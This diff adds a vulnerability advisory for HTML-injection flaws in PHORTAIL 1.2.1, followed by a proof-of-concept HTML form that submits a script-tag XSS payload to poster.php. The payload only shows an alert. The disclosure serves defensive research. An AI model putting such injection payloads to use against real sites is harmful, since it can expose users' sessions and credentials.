@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/34038/info
+
+PHORTAIL is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+PHORTAIL 1.2.1 is vulnerable; other versions may also be affected.
+
+<html><head><title>PHORTAIL v1.2.1 XSS Vulnerability</title></head> <hr><pre> Module : PHORTAIL 1.2.1 download : http://www.phpscripts-fr.net/scripts/download.php?id=330 Vul : XSS Vulnerability file : poster.php Author : Jonathan Salwan Mail : submit [AT] shell-storm.org Web : http://www.shell-storm.org </pre><hr> <form name="rapporter" action="http://www.example.com/poster.php" method="POST"></br> <input type="hidden" name="ajn" value="1"> <input type="text" name="pseudo" value="xss">=>Pseudo</br> <input type="text" name="email" value="xss@xss.com">=>E-mail</br> <input type="text" name="ti" value="<script>alert('xss PoC');</script>">=>XSS vulnerability</br> <input type="text" name="txt" value="xss">=>text</br> <input type="submit" value="Start"></br> </form> </html> 
